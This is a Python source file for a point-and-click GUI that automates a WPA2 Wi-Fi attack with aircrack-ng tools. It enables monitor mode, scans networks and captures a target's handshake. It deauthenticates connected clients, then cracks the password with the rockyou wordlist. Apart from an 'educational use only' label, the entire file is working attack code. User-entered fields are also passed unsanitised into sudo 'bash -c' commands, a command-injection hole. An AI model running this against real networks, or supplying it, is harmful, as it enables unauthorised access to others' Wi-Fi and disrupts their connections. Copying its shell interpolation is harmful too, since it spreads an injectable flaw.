import tkinter as tk
from tkinter import messagebox
import subprocess
import os

# === Configuration ===
INTERFACE = "wlan0"
WORDLIST = "rockyou.txt"  # Make sure it's in the same folder
CAPTURE_FILE = "handshake"  # Output file prefix

# === Helper Functions ===
def enable_monitor_mode():
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "down"])
    subprocess.run(["sudo", "iw", "dev", INTERFACE, "set", "type", "monitor"])
    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"])

def start_scan():
    enable_monitor_mode()
    subprocess.Popen([
        "x-terminal-emulator", "-e",
        "sudo", "airodump-ng", INTERFACE
    ])

def paste_bssid():
    try:
        bssid = root.clipboard_get()
        bssid_entry.delete(0, tk.END)
        bssid_entry.insert(0, bssid.strip())
    except tk.TclError:
        messagebox.showerror("Clipboard Error", "Clipboard is empty or unsupported.")

def capture_and_crack():
    ssid = ssid_entry.get()
    bssid = bssid_entry.get()
    channel = channel_entry.get()

    if not ssid or not bssid or not channel:
        messagebox.showerror("Missing Info", "Please fill SSID, BSSID, and Channel.")
        return

    # Capture handshake
    subprocess.Popen([
        "x-terminal-emulator", "-e",
        "bash", "-c",
        f"sudo airodump-ng --bssid {bssid} --channel {channel} --write {CAPTURE_FILE} {INTERFACE}; exec bash"
    ])
    messagebox.showinfo("Capturing", "Handshake capture started.\nClick OK after some time to run deauth.")

    # Deauth attack
    subprocess.Popen([
        "x-terminal-emulator", "-e",
        "bash", "-c",
        f"sudo aireplay-ng --deauth 10 -a {bssid} {INTERFACE}; exec bash"
    ])
    messagebox.showinfo("Deauth Sent", "Click OK to try cracking the password.")

    # Crack handshake
    subprocess.Popen([
        "x-terminal-emulator", "-e",
        "bash", "-c",
        f"aircrack-ng {CAPTURE_FILE}-01.cap -w {WORDLIST}; exec bash"
    ])

# === GUI Setup ===
root = tk.Tk()
root.title("Wi-Fi WPA2 Attack Tool (Educational)")
root.geometry("400x400")
tk.Label(root, text="Wi-Fi WPA2 Crack Demo", font=("Helvetica", 14, "bold")).pack(pady=10)

# Scan Button
tk.Button(root, text="1. Start Scan (airodump-ng)", command=start_scan).pack(pady=10)

# SSID input
tk.Label(root, text="SSID:").pack()
ssid_entry = tk.Entry(root, width=35)
ssid_entry.pack()

# BSSID input
tk.Label(root, text="BSSID (MAC):").pack()
bssid_entry = tk.Entry(root, width=35)
bssid_entry.pack()
tk.Button(root, text="📋 Paste BSSID", command=paste_bssid).pack(pady=2)

# Channel input
tk.Label(root, text="Channel:").pack()
channel_entry = tk.Entry(root, width=10)
channel_entry.pack()

# Attack Button
tk.Button(root, text="2. Capture + Deauth + Crack", command=capture_and_crack, bg="#c62828", fg="white").pack(pady=20)

tk.Label(root, text="Make sure rockyou.txt is in this folder.").pack(pady=5)
tk.Label(root, text="For educational use only.").pack(pady=5)

root.mainloop()